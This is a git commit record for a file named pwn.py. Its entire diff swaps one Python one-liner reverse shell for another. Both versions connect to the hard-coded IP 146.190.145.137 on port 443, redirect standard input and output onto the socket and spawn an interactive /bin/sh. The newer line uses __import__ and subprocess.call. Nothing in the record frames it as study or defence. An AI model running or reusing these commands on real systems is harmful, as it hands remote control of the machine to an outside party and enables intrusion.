d9e6495a9a7cf4f2db0e2ce3a483e0e9af544198
Ahsan Khan <coderahsan@gmail.com>
2023-11-01 14:30:18 +0500

    Update pwn.py

--- pwn.py
+++ pwn.py
@@ -1,1 +1,1 @@
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.190.145.137",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.190.145.137",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
